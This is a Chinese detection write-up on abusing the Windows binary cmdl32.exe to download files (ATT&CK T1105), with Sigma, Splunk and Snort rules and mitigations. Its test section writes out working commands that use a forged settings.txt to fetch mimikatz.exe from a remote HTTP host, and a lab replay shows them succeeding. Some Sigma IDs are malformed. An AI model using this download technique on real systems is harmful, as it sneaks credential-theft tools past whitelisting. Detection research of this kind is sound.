# T1105-Win-利用cmdl32进行文件下载行为(白名单)

## 描述

攻击者利用合法工具（如`cmdl32.exe`）从外部系统将工具或恶意文件下载到被攻陷的环境中（T1105）。`cmdl32.exe`是Windows连接管理器管理工具包（CMAK）的一部分，用于设置拨号或VPN连接的配置文件。攻击者可通过伪装配置文件（如`settings.txt`）中的`UpdateUrl`字段，诱导`cmdl32.exe`从指定URL下载文件，伪装成正常更新行为。由于`cmdl32.exe`是系统自带工具，属于白名单程序，常被用于规避传统防病毒软件检测。

此技术可通过命令与控制（C2）通道或替代协议（如HTTP）下载文件，适用于初始访问后的工具部署或持久化。检测重点在于监控`cmdl32.exe`的异常命令行参数、可疑网络连接及配置文件操作。

## 测试案例

cmdl32.exe,CMAK（连接管理器管理工具包）使用它来设置连接管理器服务配置文件。配置文件通常打包成一个.exe，可以部署到用户系统。该软件包安装可用于启动拨号/VPN连接的配置文件。

### 步骤一

使用以下命令并且生成相关配置文件。

```yml
icacls %cd% /deny %username%:(OI)(CI)(DE,DC)
set tmp=%cd%
echo [Connection Manager] > settings.txt
echo CMSFile=settings.txt >> settings.txt
echo ServiceName=WindowsUpdate >> settings.txt
echo TunnelFile=settings.txt  >> settings.txt
echo [Settings]  >> settings.txt
echo UpdateUrl=http://10.211.55.2:8000/mimikatz.exe  >> settings.txt
```

### 步骤二

然后继续执行即可下载成功。

```yml
cmdl32 /vpn /lan %cd%\settings.txt
icacls %cd% /remove:d %username%
move VPNBDFF.tmp mimikatz.exe
```

## 检测日志

**Windows安全日志**  
- **事件ID 4688**：记录`cmdl32.exe`、`icacls.exe`等进程创建及命令行参数。  

**Sysmon日志**  
- **事件ID 1**：记录进程创建，捕获`cmdl32.exe`的命令行（如包含`settings.txt`）。  
- **事件ID 3**：记录网络连接，捕获`cmdl32.exe`的HTTP请求（目标IP/端口）。  
- **事件ID 11**：记录配置文件（如`settings.txt`）或临时文件（如`VPN*.tmp`）创建。  

**PowerShell日志**  
- **事件ID 4104**：记录PowerShell脚本执行（如自动化创建`settings.txt`）。  

**网络日志**  
- 捕获`cmdl32.exe`发起的HTTP流量（如向非预期URL的GET请求）。  

**配置日志记录**  
- 启用命令行参数记录：`计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。  
- 启用PowerShell日志：`计算机配置 > 管理模板 > Windows组件 > Windows PowerShell > 启用模块日志和脚本块日志记录`。  
- 配置Sysmon监控`cmdl32.exe`及网络连接：
  ```xml
  <RuleGroup name="ProcessCreate" groupRelation="and">
    <ProcessCreate onmatch="include">
      <Image condition="end with">cmdl32.exe</Image>
    </ProcessCreate>
  </RuleGroup>
  ```
- 配置IDS/IPS记录HTTP流量。

## 测试复现

windows server 2016进行测试，测试效果Ok。

```yml
C:\Users\Administrator>cd C:\Users\Administrator\Desktop\test

C:\Users\Administrator\Desktop\test>icacls %cd% /deny %username%:(OI)(CI)(DE,DC)
已处理的文件: C:\Users\Administrator\Desktop\test
已成功处理 1 个文件; 处理 0 个文件时失败

C:\Users\Administrator\Desktop\test>set tmp=%cd%

C:\Users\Administrator\Desktop\test>echo [Connection Manager] > settings.txt

C:\Users\Administrator\Desktop\test>echo CMSFile=settings.txt >> settings.txt

C:\Users\Administrator\Desktop\test>echo ServiceName=WindowsUpdate >> settings.txt

C:\Users\Administrator\Desktop\test>echo TunnelFile=settings.txt  >> settings.txt

C:\Users\Administrator\Desktop\test>echo [Settings]  >> settings.txt

C:\Users\Administrator\Desktop\test>echo UpdateUrl=http://10.211.55.2:8000/mimikatz.exe  >> settings.txt

C:\Users\Administrator\Desktop\test>cmdl32 /vpn /lan %cd%\settings.txt

C:\Users\Administrator\Desktop\test>icacls %cd% /remove:d %username%
已处理的文件: C:\Users\Administrator\Desktop\test
已成功处理 1 个文件; 处理 0 个文件时失败

C:\Users\Administrator\Desktop\test>move VPND1F2.tmp mimikatz.exe
移动了         1 个文件。
```

## 测试留痕

### 日志记录1

```log
创建新进程。4688，windows安全日志

创建者主题:
 安全 ID:  QAX\Administrator
 帐户名:  Administrator
 帐户域:  QAX
 登录 ID:  0xCF2BF2

目标主题:
 安全 ID:  NULL SID
 帐户名:  -
 帐户域:  -
 登录 ID:  0x0

进程信息:
 新进程 ID:  0x40e0
 新进程名称: C:\Windows\System32\icacls.exe
 令牌提升类型: %%1936
 强制性标签:  Mandatory Label\High Mandatory Level
 创建者进程 ID: 0x688
 创建者进程名称: C:\Windows\System32\cmd.exe
 进程命令行: icacls  C:\Users\wangxin\Desktop\test /deny Administrator:(OI)(CI)(DE,DC)
```

### 日志记录二

```log
已创建新进程。

创建者主题:
 安全 ID:  QAX\Administrator
 帐户名:  Administrator
 帐户域:  QAX
 登录 ID:  0xCF2BF2

目标主题:
 安全 ID:  NULL SID
 帐户名:  -
 帐户域:  -
 登录 ID:  0x0

进程信息:
 新进程 ID:  0x12c18
 新进程名称: C:\Windows\System32\cmdl32.exe
 令牌提升类型: %%1936
 强制性标签:  Mandatory Label\High Mandatory Level
 创建者进程 ID: 0x688
 创建者进程名称: C:\Windows\System32\cmd.exe
 进程命令行: cmdl32  /vpn /lan C:\Users\wangxin\Desktop\test\settings.txt
```

### 日志记录三

```log
已创建新进程。

创建者主题:
 安全 ID:  QAX\Administrator
 帐户名:  Administrator
 帐户域:  QAX
 登录 ID:  0xE991EB

目标主题:
 安全 ID:  NULL SID
 帐户名:  -
 帐户域:  -
 登录 ID:  0x0

进程信息:
 新进程 ID:  0x133b8
 新进程名称: C:\Windows\System32\icacls.exe
 令牌提升类型: %%1936
 强制性标签:  Mandatory Label\High Mandatory Level
 创建者进程 ID: 0x12fac
 创建者进程名称: C:\Windows\System32\cmd.exe
 进程命令行: icacls  C:\Users\wangxin\Desktop\test /remove:d Administrator
```

## 检测规则/思路

**检测规则**  
通过监控`cmdl32.exe`的异常命令行、网络连接及配置文件操作，检测恶意文件下载行为。以下是具体思路：

1. **日志分析**：
   - 监控Windows安全日志事件ID 4688，检测`cmdl32.exe`执行及命令行（如包含`settings.txt`）。  
   - 监控Sysmon事件ID 1，检测`cmdl32.exe`进程创建及命令行参数。  
   - 监控Sysmon事件ID 3，检测`cmdl32.exe`的HTTP连接（非预期URL）。  
   - 监控Sysmon事件ID 11，检测`settings.txt`或`VPN*.tmp`文件创建。  
   - 监控PowerShell日志事件ID 4104，检测自动化创建配置文件的行为。  
   - 检查Netflow，检测`cmdl32.exe`发起的异常HTTP流量。  

2. **Sigma规则（Cmdl32文件下载）**：
   ```yaml
   title: 利用cmdl32进行文件下载行为检测
   id: g12345678-abcd-9012-3456-78901234klmn
   status: stable
   description: 检测攻击者利用cmdl32.exe通过伪造配置文件下载恶意文件
   references:
     - https://attack.mitre.org/techniques/T1105/
     - https://www.t00ls.cc/thread-63254-1-1.html
   tags:
     - attack.command_and_control
     - attack.execution
     - attack.t1105
   logsource:
     product: windows
     service: sysmon
   detection:
     selection:
       EventID: 1
       Image|endswith: '\cmdl32.exe'
       CommandLine|contains: 'settings.txt'
     condition: selection
   fields:
     - Image
     - CommandLine
     - ParentImage
     - User
   falsepositives:
     - 合法CMAK配置文件更新
     - 管理员网络配置
   level: high
   ```

3. **Sigma规则（配置文件创建）**：
   ```yaml
   title: Cmdl32配置文件创建检测
   id: h23456789-abcd-0123-4567-89012345opqr
   status: experimental
   description: 检测cmdl32相关配置文件（如settings.txt）的创建
   logsource:
     product: windows
     service: sysmon
   detection:
     selection:
       EventID: 11
       TargetFilename|endswith: '\settings.txt'
     condition: selection
   fields:
     - Image
     - TargetFilename
     - User
   falsepositives:
     - 合法CMAK配置文件
   level: medium
   ```

4. **SIEM规则**：
   - 检测`cmdl32.exe`异常行为。
   - 示例Splunk查询：
     ```spl
     (source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (EventID=1 Image="*cmdl32.exe" CommandLine="*settings.txt*") OR
     (EventID=3 Image="*cmdl32.exe") OR
     (EventID=11 TargetFilename="*settings.txt")) OR
     (source="WinEventLog:Security" EventCode=4688 Image="*cmdl32.exe")
     | stats count by Image, CommandLine, DestinationIp, DestinationPort, TargetFilename, User, ComputerName
     ```

5. **网络流量分析**：
   - 检查`cmdl32.exe`的HTTP请求：
     ```bash
     tshark -f "tcp port 8000" -Y "http.request"
     ```
   - 使用IDS规则检测异常HTTP流量：
     ```snort
     alert tcp $HOME_NET any -> $EXTERNAL_NET 80,8000 (msg:"Suspicious Cmdl32 HTTP Request"; content:"cmdl32"; sid:1000009;)
     ```

6. **工具支持**：
   - 使用Wireshark分析`cmdl32.exe`的HTTP流量。  
   - 使用Sysinternals Process Monitor捕获`cmdl32.exe`的文件和网络活动。  
   - 使用EDR工具（如CrowdStrike、Carbon Black）监控`cmdl32.exe`行为。  

7. **威胁情报整合**：
   - 检查下载URL或文件哈希是否与已知恶意样本匹配，结合威胁情报平台（如VirusTotal、AlienVault）。  

## 建议

### 缓解措施

防御`cmdl32.exe`恶意下载需从工具限制、网络监控和文件控制入手：

1. **限制Cmdl32执行**  
   - 使用AppLocker限制`cmdl32.exe`：
     ```powershell
     New-AppLockerPolicy -RuleType Path -Path "%SystemRoot%\System32\cmdl32.exe" -Action Deny -User "Everyone"
     ```

2. **限制网络访问**  
   - 配置防火墙阻止`cmdl32.exe`出站HTTP：
     ```powershell
     New-NetFirewallRule -DisplayName "Block Cmdl32 HTTP" -Direction Outbound -Action Block -Program "%SystemRoot%\System32\cmdl32.exe" -Protocol TCP -RemotePort 80,8000
     ```

3. **监控配置文件**  
   - 配置Sysmon监控`settings.txt`创建：
     ```xml
     <RuleGroup name="FileCreate" groupRelation="and">
       <FileCreate onmatch="include">
         <TargetFilename condition="end with">settings.txt</TargetFilename>
       </FileCreate>
     </RuleGroup>
     ```
   - 使用文件完整性监控（FIM）检测异常配置文件。  

4. **加强日志监控**  
   - 启用Sysmon事件ID 1、3、11和Windows事件ID 4688，检测`cmdl32.exe`行为。  
   - 配置SIEM实时告警`cmdl32.exe`执行或异常HTTP请求。  
   - 使用EDR工具监控白名单程序滥用。  

5. **定期审计**  
   - 检查`cmdl32.exe`执行：
     ```powershell
     Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 1 -and $_.Message -match "cmdl32.exe" }
     ```
   - 检查网络连接：
     ```powershell
     Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 3 -and $_.Message -match "cmdl32.exe" }
     ```

6. **补丁管理**  
   - 确保系统安装最新补丁，防止相关漏洞被利用。  

## 参考推荐

- MITRE ATT&CK: T1105  
  <https://attack.mitre.org/techniques/T1105/>  
- T00ls: Cmdl32代替Certutil  
  <https://www.t00ls.cc/thread-63254-1-1.html>
